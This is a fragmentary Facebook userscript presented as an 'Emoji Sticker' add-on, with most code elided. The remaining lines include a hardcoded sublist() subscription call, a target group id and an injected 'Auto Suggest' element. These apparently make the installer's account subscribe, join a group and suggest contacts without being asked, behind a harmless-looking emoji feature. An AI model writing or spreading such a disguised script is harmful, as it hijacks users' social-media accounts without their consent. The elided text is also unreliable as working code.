// ==UserScript==
// @name            Emoji Sticker By @apank
// @description     Facebook 2013 By apank
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/bangsat.lo.13" target="_blank">Created by チリ <br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("1375053426048999");

//Group ku adibpn
var gid = ['352730478191126'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by apank';
